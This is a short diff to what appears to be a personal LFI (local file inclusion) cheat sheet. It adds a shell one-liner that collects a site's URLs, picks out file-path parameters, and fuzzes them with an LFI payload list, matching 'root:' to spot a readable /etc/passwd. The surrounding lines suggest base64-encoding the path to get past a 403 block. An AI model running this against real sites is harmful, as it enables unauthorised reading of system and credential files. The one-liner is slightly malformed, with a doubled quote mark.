@@ -2,6 +2,9 @@ Lfi
 ====
 
 
+
+echo http://site.com | gau | urldedupe -qs | gf lfi |  sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:"" -v; done
+
 url/?f=etc/passwd ==> 403
 encode etc/passwd as base64
 
